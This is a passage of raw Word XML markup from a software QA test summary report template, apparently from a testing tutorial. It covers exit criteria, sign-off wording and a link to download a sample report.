        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="940" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="941" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Example:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="128"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="942" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="943" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>A repetitive task done manually every time was time consuming. This task was automated by creating scripts and run each time, which saved time and resources.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="128"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="944" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="945" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Smoke test cases were automated and the scripts were run, which ran fast and saved time.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="128"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="946" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="947" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Automation scripts were prepared to create new customers, where lot of records need to be created for Testing.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="128"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="948" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="949" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">Business critical scenarios are separately tested on the entire </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>application which are</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> vital to certify they works fine.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="950" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="951" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Step #10: Exit Criteria</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="952" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="953" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>&lt;Exit Criteria is defined as a Completion of Testing by fulfilling certain conditions like</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>(i) All planned test cases are executed;</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>(</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>iI</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>) All Critical defects are Closed etc.&gt;</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Example:</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>a)</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> All test cases should be executed – </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Yes</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>b)</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> All defects in Critical, Major, Medium severity should be verified and closed – </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Yes</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>c) </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">Any open defects in </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Trivial</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> severity – </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Action plan prepared with expected dates of closure.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="954" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="955" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>No Severity1 defects should be ‘</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>OPEN</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>’; Only 2 Severity2 defects should be ‘OPEN’; Only 4 Severity3 defects should be ‘OPEN’. Note: This may vary from project to project. Plan of Action for the Open defects should be clearly mentioned with details on when &amp; how they will be addressed and closed.&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="956" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="957" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Step #11: Conclusion/Sign Off</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="958" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="959" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>&lt;This section will mention whether the Testing team agrees and gives a Green signal for the application to ‘Go Live’ or not, after the Exit Criteria was met. If the application does not meet the Exit Criteria, then it can be mentioned as – “The application is not suggested to ‘Go Live’. It will be left with the decision of Senior Management and Client and other Stakeholders involved to take the call on whether the application can ‘Go Live’ or not.&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="960" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="961" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Example: </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>As the Exit criteria was met and satisfied as mentioned in Section 10, this application is suggested to ‘Go Live’ by the Testing team. Appropriate User/Business acceptance testing should be performed before ‘Go Live’.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="962" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="963" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Step #12: Definitions, Acronyms, and Abbreviations</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="964" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="965" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>&lt;This section mentions the meanings of Abbreviated terms used in this document and any other new definitions&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="966" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="967" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>=&gt; </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF0000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Download Sample Test Summary Report</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FF0000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://cdn.softwaretestinghelp.com/wp-content/qa/uploads/2014/06/Sample-Test-Summary-Report-by-SoftwareTestingHelp.pdf" \o "sample test summary report example" \t "_blank" </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="777777"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Click here to download</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> a sample test report template with an example.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="968" w:author="Unknown"/>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14:anchorId="2607837A" wp14:editId="094BA8C1">
            <wp:extent cx="3328035" cy="3962400"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="46" name="Picture 46" descr="test report templat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st report templat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28035" cy="3962400"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="969" w:author="Unknown"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="000000"/>
          <w:sz w:val="31"/>
          <w:szCs w:val="31"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="970" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="000000"/>
            <w:sz w:val="31"/>
            <w:szCs w:val="31"/>
          </w:rPr>
          <w:t>Few points to note while preparing the Test Summary Report:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="129"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="971" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="972" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>As part of Test Execution, collect all required information on the Testing performed. This will help to prepare a sound Test summary report.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="129"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="973" w:author="Unknown"/>
